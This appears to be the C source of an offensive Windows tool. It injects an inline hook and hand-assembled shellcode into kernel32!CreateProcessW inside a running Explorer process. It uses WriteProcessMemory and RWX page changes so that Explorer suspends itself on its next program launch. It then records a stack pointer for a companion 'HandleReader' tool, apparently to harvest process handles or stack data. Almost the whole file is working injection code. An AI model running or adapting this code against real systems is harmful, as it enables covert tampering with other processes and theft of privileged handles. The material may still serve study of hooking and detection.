#include "Decode.h"

#include <Psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI NtSuspendProcess(HANDLE process);
EXTERN_C NTSTATUS NTAPI NtResumeProcess(HANDLE process);

#define MAX_FUNC_SIZE        0x180
#define SHELLCODE_CAPACITY   0x12
#define SHELLCODE_CODE_SIZE  17
#define RSP_SLOT_SIZE        0x08
#define INLINE_HOOK_SIZE     0x05
#define PROLOGUE_FRAME_SIZE  0x58
#define DEFAULT_TIMEOUT_SEC  120
#define RESUME_GRACE_MS      250

typedef struct
{
	LPCBYTE function;
	DWORD funcSize;
	LPCBYTE internalCall;
	BYTE callLength;
	LPCBYTE hookSite;
	LPCBYTE shellcodeSite;
	LPCBYTE rspSlot;
} LAYOUT;

static BOOL VerifyPrologue(LPCBYTE function, DWORD* prologueSize)
{
	*prologueSize = 0;

	ZydisDisassembledInstruction mov = { 0 };
	ZyanStatus status = DisassembleInstruction(function, &mov);
	if (!ZYAN_SUCCESS(status))
	{
		fprintf(stderr, "[-] Prologue MOV decode failed: 0x%08X\n", (unsigned)status);
		return FALSE;
	}

	if (mov.info.mnemonic != ZYDIS_MNEMONIC_MOV ||
		mov.info.operand_count_visible != 2 ||
		mov.operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER ||
		mov.operands[1].type != ZYDIS_OPERAND_TYPE_REGISTER ||
		mov.operands[0].reg.value != ZYDIS_REGISTER_R11 ||
		mov.operands[1].reg.value != ZYDIS_REGISTER_RSP)
	{
		fprintf(stderr, "[-] First instruction is not MOV r11, rsp\n");
		return FALSE;
	}

	ZydisDisassembledInstruction sub = { 0 };
	status = DisassembleInstruction(function + mov.info.length, &sub);
	if (!ZYAN_SUCCESS(status))
	{
		fprintf(stderr, "[-] Prologue SUB decode failed: 0x%08X\n", (unsigned)status);
		return FALSE;
	}

	if (sub.info.mnemonic != ZYDIS_MNEMONIC_SUB ||
		sub.info.operand_count != 3 ||
		sub.operands[0].type != ZYDIS_OPERAND_TYPE_REGISTER ||
		sub.operands[0].reg.value != ZYDIS_REGISTER_RSP ||
		sub.operands[1].type != ZYDIS_OPERAND_TYPE_IMMEDIATE ||
		sub.operands[1].imm.value.u != PROLOGUE_FRAME_SIZE)
	{
		fprintf(stderr, "[-] Second instruction is not SUB rsp, 0x58\n");
		return FALSE;
	}

	*prologueSize = mov.info.length + sub.info.length;
	return TRUE;
}

static BOOL FindInternalCall(LPCBYTE function, DWORD funcSize, LPCBYTE* call, BYTE* callLength)
{
	*call = NULL;
	*callLength = 0;

	DWORD offset = 0;
	while (offset < funcSize)
	{
		ZydisDisassembledInstruction decoded = { 0 };
		ZyanStatus status = DisassembleInstruction(function + offset, &decoded);
		if (!ZYAN_SUCCESS(status))
		{
			fprintf(stderr, "[-] Decode failed at function offset 0x%X: 0x%08X\n", offset, (unsigned)status);
			return FALSE;
		}

		if (decoded.info.mnemonic == ZYDIS_MNEMONIC_CALL)
		{
			*call = function + offset;
			*callLength = decoded.info.length;
			return TRUE;
		}

		offset += decoded.info.length;
	}

	fprintf(stderr, "[-] No internal CALL found within the function\n");
	return FALSE;
}

static BOOL CheckInt3Padding(LPCBYTE region, SIZE_T size)
{
	for (SIZE_T i = 0; i < size; ++i)
		if (region[i] != 0xCC)
			return FALSE;
	return TRUE;
}

static BOOL FitsRel8(INT64 displacement)
{
	return displacement >= -128 && displacement <= 127;
}

static BOOL FitsRel32(INT64 displacement)
{
	return displacement >= INT32_MIN && displacement <= INT32_MAX;
}

static BOOL AssessLayout(LPCBYTE function, LAYOUT* layout)
{
	ZeroMemory(layout, sizeof(*layout));
	layout->function = function;

	DWORD prologueSize = 0;
	if (!VerifyPrologue(function, &prologueSize))
		return FALSE;
	printf("[+] Prologue: MOV r11, rsp; SUB rsp, 0x58 (%lu bytes)\n", prologueSize);

	DWORD funcSize = (DWORD)GetFunctionSize(function, MAX_FUNC_SIZE);
	if (!funcSize)
	{
		fprintf(stderr, "[-] No RET within the 0x%X byte function bound\n", MAX_FUNC_SIZE);
		return FALSE;
	}
	layout->funcSize = funcSize;
	printf("[+] Function size to first RET: 0x%X\n", funcSize);

	if (!FindInternalCall(function, funcSize, &layout->internalCall, &layout->callLength))
		return FALSE;
	printf(
		"[+] Internal CALL at +0x%zX, %u bytes (%s)\n",
		(SIZE_T)(layout->internalCall - function),
		layout->callLength,
		layout->internalCall[0] == 0xE8 ? "direct rel32" : "indirect");

	layout->hookSite = layout->internalCall + layout->callLength;
	ZydisDisassembledInstruction hookCandidate = { 0 };
	ZyanStatus status = DisassembleInstruction(layout->hookSite, &hookCandidate);
	if (!ZYAN_SUCCESS(status) ||
		hookCandidate.info.mnemonic != ZYDIS_MNEMONIC_NOP ||
		hookCandidate.info.length != INLINE_HOOK_SIZE)
	{
		fprintf(stderr, "[-] Expected a 5-byte NOP after the internal CALL\n");
		return FALSE;
	}
	printf(
		"[+] Hook site: +0x%zX, 5-byte NOP %02X %02X %02X %02X %02X\n",
		(SIZE_T)(layout->hookSite - function),
		layout->hookSite[0], layout->hookSite[1], layout->hookSite[2],
		layout->hookSite[3], layout->hookSite[4]);

	layout->rspSlot = function - RSP_SLOT_SIZE;
	if (!CheckInt3Padding(layout->rspSlot, RSP_SLOT_SIZE))
	{
		fprintf(stderr, "[-] The 8 bytes before the function are not INT3 padding\n");
		return FALSE;
	}
	printf("[+] RSP save slot: function-0x8, INT3 padding intact\n");

	layout->shellcodeSite = function + funcSize;
	if (funcSize + SHELLCODE_CAPACITY > MAX_FUNC_SIZE)
	{
		fprintf(stderr, "[-] Shellcode would exceed the 0x%X byte patch bound\n", MAX_FUNC_SIZE);
		return FALSE;
	}
	if (!CheckInt3Padding(layout->shellcodeSite, SHELLCODE_CAPACITY))
	{
		fprintf(stderr, "[-] The 18 bytes after the function are not INT3 padding\n");
		return FALSE;
	}
	printf("[+] Shellcode site: function+0x%X, 18 bytes of INT3 padding intact\n", funcSize);

	HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
	if (!ntdll)
	{
		fprintf(stderr, "[-] GetModuleHandleW(ntdll): E%lu\n", GetLastError());
		return FALSE;
	}
	FARPROC ntSuspendProcess = GetProcAddress(ntdll, "NtSuspendProcess");
	if (!ntSuspendProcess)
	{
		fprintf(stderr, "[-] GetProcAddress(NtSuspendProcess): E%lu\n", GetLastError());
		return FALSE;
	}

	INT64 callDisp = (INT64)ntSuspendProcess - (INT64)(layout->shellcodeSite + 15);
	if (!FitsRel32(callDisp))
	{
		fprintf(stderr, "[-] NtSuspendProcess is outside rel32 reach of the shellcode CALL\n");
		return FALSE;
	}
	printf("[+] NtSuspendProcess rel32 displacement: 0x%llX (fits)\n", (unsigned long long)callDisp);

	INT64 hookDisp = (INT64)layout->shellcodeSite - (INT64)(layout->hookSite + 2);
	INT64 trampolineDisp = (INT64)(layout->hookSite + INLINE_HOOK_SIZE) - (INT64)(layout->shellcodeSite + SHELLCODE_CODE_SIZE);
	if (!FitsRel8(hookDisp) || !FitsRel8(trampolineDisp))
	{
		fprintf(stderr, "[-] Hook or trampoline displacement does not fit rel8\n");
		return FALSE;
	}
	printf(
		"[+] Hook rel8: 0x%02X, trampoline rel8: 0x%02X (both fit)\n",
		(unsigned)(BYTE)hookDisp,
		(unsigned)(BYTE)trampolineDisp);

	return TRUE;
}

static UINT_PTR GetRemoteModuleBase(HANDLE process, LPCWSTR moduleName)
{
	HMODULE modules[1024] = { 0 };
	DWORD needed = 0;

	if (!K32EnumProcessModules(process, modules, sizeof(modules), &needed))
	{
		fprintf(stderr, "[-] K32EnumProcessModules: E%lu\n", GetLastError());
		return 0;
	}

	for (DWORD i = 0; i < needed / sizeof(HMODULE); ++i)
	{
		WCHAR name[MAX_PATH] = { 0 };
		if (!K32GetModuleBaseNameW(process, modules[i], name, MAX_PATH))
			continue;
		if (!_wcsicmp(name, moduleName))
			return (UINT_PTR)modules[i];
	}

	fprintf(stderr, "[-] Module %ls not found in the target process\n", moduleName);
	return 0;
}

static BOOL ReadRemote(HANDLE process, UINT_PTR address, LPVOID buffer, SIZE_T size)
{
	SIZE_T read = 0;
	if (!ReadProcessMemory(process, (LPCVOID)address, buffer, size, &read) || read != size)
	{
		fprintf(stderr, "[-] ReadProcessMemory at 0x%llX: E%lu\n", (unsigned long long)address, GetLastError());
		return FALSE;
	}
	return TRUE;
}

static BOOL WriteRemoteVerified(HANDLE process, UINT_PTR address, LPCVOID buffer, SIZE_T size)
{
	SIZE_T written = 0;
	if (!WriteProcessMemory(process, (LPVOID)address, buffer, size, &written) || written != size)
	{
		fprintf(stderr, "[-] WriteProcessMemory at 0x%llX: E%lu\n", (unsigned long long)address, GetLastError());
		return FALSE;
	}

	BYTE readBack[64] = { 0 };
	if (size > sizeof(readBack))
	{
		fprintf(stderr, "[-] Write too large for read-back verification\n");
		return FALSE;
	}
	if (!ReadRemote(process, address, readBack, size))
		return FALSE;
	if (memcmp(readBack, buffer, size))
	{
		fprintf(stderr, "[-] Read-back mismatch at 0x%llX\n", (unsigned long long)address);
		return FALSE;
	}
	return TRUE;
}

static BOOL WaitForEnter(DWORD timeoutSec)
{
	HANDLE console = GetStdHandle(STD_INPUT_HANDLE);
	ULONGLONG start = GetTickCount64();

	for (;;)
	{
		INPUT_RECORD record = { 0 };
		DWORD read = 0;

		while (PeekConsoleInputW(console, &record, 1, &read) && read > 0)
		{
			if (!ReadConsoleInputW(console, &record, 1, &read))
			{
				fprintf(stderr, "[-] ReadConsoleInputW: E%lu\n", GetLastError());
				return FALSE;
			}
			if (record.EventType == KEY_EVENT &&
				record.Event.KeyEvent.bKeyDown &&
				record.Event.KeyEvent.wVirtualKeyCode == VK_RETURN)
				return TRUE;
		}

		if (GetTickCount64() - start >= (ULONGLONG)timeoutSec * 1000)
		{
			fprintf(stderr, "[-] Timed out after %lu seconds waiting for ENTER\n", timeoutSec);
			return FALSE;
		}
		Sleep(50);
	}
}

static INT AssessMain(void)
{
	HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
	if (!kernel32)
	{
		fprintf(stderr, "[-] GetModuleHandleW(kernel32): E%lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	FARPROC createProcessW = GetProcAddress(kernel32, "CreateProcessW");
	if (!createProcessW)
	{
		fprintf(stderr, "[-] GetProcAddress(CreateProcessW): E%lu\n", GetLastError());
		return EXIT_FAILURE;
	}

	printf("[+] kernel32!CreateProcessW: 0x%p (read-only assessment)\n", (LPCVOID)createProcessW);

	LAYOUT layout = { 0 };
	if (!AssessLayout((LPCBYTE)createProcessW, &layout))
	{
		printf("[-] ASSESSMENT: layout is NOT compatible with the capture mechanism\n");
		return EXIT_FAILURE;
	}

	printf("[+] ASSESSMENT: layout compatible; no process was opened or modified\n");
	return EXIT_SUCCESS;
}

static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
{
	INT result = EXIT_FAILURE;
	HANDLE explorer = NULL;
	BOOL protectionChanged = FALSE;
	BOOL hookWritten = FALSE;
	BOOL shellcodeWritten = FALSE;
	BOOL hookRestored = FALSE;
	MEMORY_BASIC_INFORMATION pages[2];
	DWORD pageCount = 0;
	UINT_PTR remoteFunction = 0;
	UINT_PTR remoteHook = 0;
	UINT_PTR remoteShellcode = 0;
	UINT_PTR remoteRspSlot = 0;
	BYTE originalHook[INLINE_HOOK_SIZE] = { 0 };
	BYTE originalPadding[SHELLCODE_CAPACITY] = { 0 };

	LAYOUT layout = { 0 };
	HMODULE kernel32 = GetModuleHandleW(L"kernel32.dll");
	if (!kernel32)
	{
		fprintf(stderr, "[-] GetModuleHandleW(kernel32): E%lu\n", GetLastError());
		return EXIT_FAILURE;
	}
	FARPROC createProcessW = GetProcAddress(kernel32, "CreateProcessW");
	if (!createProcessW)
	{
		fprintf(stderr, "[-] GetProcAddress(CreateProcessW): E%lu\n", GetLastError());
		return EXIT_FAILURE;
	}
	if (!AssessLayout((LPCBYTE)createProcessW, &layout))
	{
		fprintf(stderr, "[-] Local layout assessment failed; refusing to capture\n");
		return EXIT_FAILURE;
	}

	explorer = OpenProcess(
		PROCESS_QUERY_INFORMATION | PROCESS_SUSPEND_RESUME |
		PROCESS_VM_READ | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
		FALSE,
		explorerPid);
	if (!explorer)
	{
		fprintf(stderr, "[-] OpenProcess(%lu): E%lu\n", explorerPid, GetLastError());
		return EXIT_FAILURE;
	}

	UINT_PTR remoteKernel32 = GetRemoteModuleBase(explorer, L"kernel32.dll");
	UINT_PTR remoteNtdll = GetRemoteModuleBase(explorer, L"ntdll.dll");
	if (!remoteKernel32 || !remoteNtdll)
		goto _FINAL;

	remoteFunction = remoteKernel32 + ((UINT_PTR)layout.function - (UINT_PTR)kernel32);
	remoteHook = remoteKernel32 + ((UINT_PTR)layout.hookSite - (UINT_PTR)kernel32);
	remoteShellcode = remoteFunction + layout.funcSize;
	remoteRspSlot = remoteFunction - RSP_SLOT_SIZE;

	UINT_PTR localNtdll = (UINT_PTR)GetModuleHandleW(L"ntdll.dll");
	UINT_PTR localNtSuspend = (UINT_PTR)GetProcAddress((HMODULE)localNtdll, "NtSuspendProcess");
	if (!localNtdll || !localNtSuspend)
	{
		fprintf(stderr, "[-] Unable to resolve local NtSuspendProcess: E%lu\n", GetLastError());
		goto _FINAL;
	}
	UINT_PTR remoteNtSuspend = remoteNtdll + (localNtSuspend - localNtdll);

	if (!ReadRemote(explorer, remoteHook, originalHook, sizeof(originalHook)))
		goto _FINAL;
	const BYTE expectedNop[INLINE_HOOK_SIZE] = { 0x0F, 0x1F, 0x44, 0x00, 0x00 };
	if (memcmp(originalHook, expectedNop, sizeof(expectedNop)))
	{
		fprintf(stderr, "[-] Remote hook site is not the expected 5-byte NOP; layout differs\n");
		goto _FINAL;
	}
	if (!ReadRemote(explorer, remoteShellcode, originalPadding, sizeof(originalPadding)))
		goto _FINAL;
	if (!CheckInt3Padding(originalPadding, sizeof(originalPadding)))
	{
		fprintf(stderr, "[-] Remote shellcode region is not INT3 padding\n");
		goto _FINAL;
	}
	BYTE remoteSlot[RSP_SLOT_SIZE] = { 0 };
	if (!ReadRemote(explorer, remoteRspSlot, remoteSlot, sizeof(remoteSlot)))
		goto _FINAL;
	if (!CheckInt3Padding(remoteSlot, sizeof(remoteSlot)))
	{
		fprintf(stderr, "[-] Remote RSP slot is not INT3 padding\n");
		goto _FINAL;
	}

	printf(
		"[+] Explorer PID............................. %lu\n"
		"[+] Remote CreateProcessW.................... 0x%llX\n"
		"[+] Remote hook site......................... 0x%llX\n"
		"[+] Remote shellcode site.................... 0x%llX\n"
		"[+] Remote RSP save slot..................... 0x%llX\n"
		"[+] Remote NtSuspendProcess.................. 0x%llX\n",
		explorerPid,
		(unsigned long long)remoteFunction,
		(unsigned long long)remoteHook,
		(unsigned long long)remoteShellcode,
		(unsigned long long)remoteRspSlot,
		(unsigned long long)remoteNtSuspend);

	BYTE shellcode[SHELLCODE_CODE_SIZE] = {
		0x48, 0x89, 0x25, 0x00, 0x00, 0x00, 0x00,
		0x6A, 0xFF,
		0x59,
		0xE8, 0x00, 0x00, 0x00, 0x00,
		0xEB, 0x00
	};

	INT64 saveDisp = (INT64)remoteRspSlot - (INT64)(remoteShellcode + 7);
	INT64 callDisp = (INT64)remoteNtSuspend - (INT64)(remoteShellcode + 15);
	INT64 trampolineDisp = (INT64)(remoteHook + INLINE_HOOK_SIZE) - (INT64)(remoteShellcode + SHELLCODE_CODE_SIZE);
	INT64 hookDisp = (INT64)remoteShellcode - (INT64)(remoteHook + 2);
	if (!FitsRel32(saveDisp) || !FitsRel32(callDisp) || !FitsRel8(trampolineDisp) || !FitsRel8(hookDisp))
	{
		fprintf(stderr, "[-] Remote displacement out of range; refusing to patch\n");
		goto _FINAL;
	}
	*(DWORD*)&shellcode[3] = (DWORD)(INT32)saveDisp;
	*(DWORD*)&shellcode[11] = (DWORD)(INT32)callDisp;
	shellcode[16] = (BYTE)trampolineDisp;

	BYTE inlineHook[INLINE_HOOK_SIZE] = { 0xEB, (BYTE)hookDisp, 0x0F, 0x1F, 0xC0 };

	UINT_PTR regionEnd = remoteRspSlot + MAX_FUNC_SIZE + RSP_SLOT_SIZE;
	for (UINT_PTR addr = remoteRspSlot; addr < regionEnd && pageCount < 2;)
	{
		MEMORY_BASIC_INFORMATION mbi = { 0 };
		if (!VirtualQueryEx(explorer, (LPCVOID)addr, &mbi, sizeof(mbi)))
		{
			fprintf(stderr, "[-] VirtualQueryEx: E%lu\n", GetLastError());
			goto _FINAL;
		}
		pages[pageCount++] = mbi;
		addr = (UINT_PTR)mbi.BaseAddress + mbi.RegionSize;
	}

	DWORD oldProtect = 0;
	if (!VirtualProtectEx(explorer, (LPVOID)remoteRspSlot, MAX_FUNC_SIZE + RSP_SLOT_SIZE, PAGE_EXECUTE_READWRITE, &oldProtect))
	{
		fprintf(stderr, "[-] VirtualProtectEx: E%lu\n", GetLastError());
		goto _FINAL;
	}
	protectionChanged = TRUE;

	if (!WriteRemoteVerified(explorer, remoteShellcode, shellcode, sizeof(shellcode)))
		goto _FINAL;
	shellcodeWritten = TRUE;

	if (!WriteRemoteVerified(explorer, remoteHook, inlineHook, sizeof(inlineHook)))
		goto _FINAL;
	hookWritten = TRUE;

	// Protection stays RWX until cleanup: the shellcode writes the RSP slot
	// (same page as the code) when the hook fires, not when it is installed.
	printf("[+] Hook and shellcode written and read back\n");
	printf("[+] Launch a program through Explorer, then press ENTER here (timeout %lu s)\n", timeoutSec);

	BOOL entered = WaitForEnter(timeoutSec);
	if (!entered)
		fprintf(stderr, "[-] No confirmation received; restoring and resuming\n");

	result = entered ? EXIT_SUCCESS : EXIT_FAILURE;

_FINAL:
	if (hookWritten)
	{
		hookRestored = WriteRemoteVerified(explorer, remoteHook, originalHook, sizeof(originalHook));
		if (!hookRestored)
		{
			fprintf(stderr, "[-] Hook restoration FAILED; Explorer may still be hooked\n");
			result = EXIT_FAILURE;
		}

		NTSTATUS status = NtResumeProcess(explorer);
		printf("[+] NtResumeProcess: 0x%08lX\n", (unsigned long)status);
		if (!NT_SUCCESS(status))
			result = EXIT_FAILURE;
	}

	// The frozen thread returns through the trampoline after resume; the
	// shellcode bytes must stay intact until that pass completes. If the
	// hook could not be restored, leave the shellcode valid so a re-fire
	// suspends again instead of executing INT3.
	if (shellcodeWritten && (!hookWritten || hookRestored))
	{
		if (hookWritten)
			Sleep(RESUME_GRACE_MS);
		if (!WriteRemoteVerified(explorer, remoteShellcode, originalPadding, sizeof(originalPadding)))
		{
			fprintf(stderr, "[-] Shellcode padding restoration FAILED\n");
			result = EXIT_FAILURE;
		}
	}

	if (protectionChanged)
	{
		for (DWORD i = 0; i < pageCount; ++i)
		{
			DWORD unused = 0;
			if (!VirtualProtectEx(explorer, pages[i].BaseAddress, pages[i].RegionSize, pages[i].Protect, &unused))
			{
				fprintf(stderr, "[-] Protection restoration FAILED: E%lu\n", GetLastError());
				result = EXIT_FAILURE;
			}
		}
	}

	if (explorer)
	{
		if (hookWritten)
			printf(
				"[+] Restored and resumed Explorer. RSP slot left for the reader:\n"
				"    HandleReader.exe %lu %llX\n",
				explorerPid,
				(unsigned long long)remoteRspSlot);
		CloseHandle(explorer);
	}
	return result;
}

int wmain(int argc, wchar_t* argv[])
{
	if (argc == 2 && !wcscmp(argv[1], L"--assess"))
		return AssessMain();

	if (argc == 2 || argc == 4)
	{
		if (argv[1][0] == L'-')
		{
			fwprintf(stderr, L"[-] Invalid PID: %s\n", argv[1]);
			return EXIT_FAILURE;
		}
		DWORD pid = (DWORD)wcstoul(argv[1], NULL, 10);
		if (!pid)
		{
			fwprintf(stderr, L"[-] Invalid PID: %s\n", argv[1]);
			return EXIT_FAILURE;
		}

		DWORD timeout = DEFAULT_TIMEOUT_SEC;
		if (argc == 4)
		{
			if (wcscmp(argv[2], L"--timeout"))
			{
				fwprintf(stderr, L"[-] Unknown option: %s\n", argv[2]);
				return EXIT_FAILURE;
			}
			timeout = (DWORD)wcstoul(argv[3], NULL, 10);
			if (!timeout)
			{
				fwprintf(stderr, L"[-] Invalid timeout: %s\n", argv[3]);
				return EXIT_FAILURE;
			}
		}
		return CaptureMain(pid, timeout);
	}

	fwprintf(stderr, L"Usage: %s <EXPLORER_PID> [--timeout SECONDS] | --assess\n", argv[0]);
	return EXIT_FAILURE;
}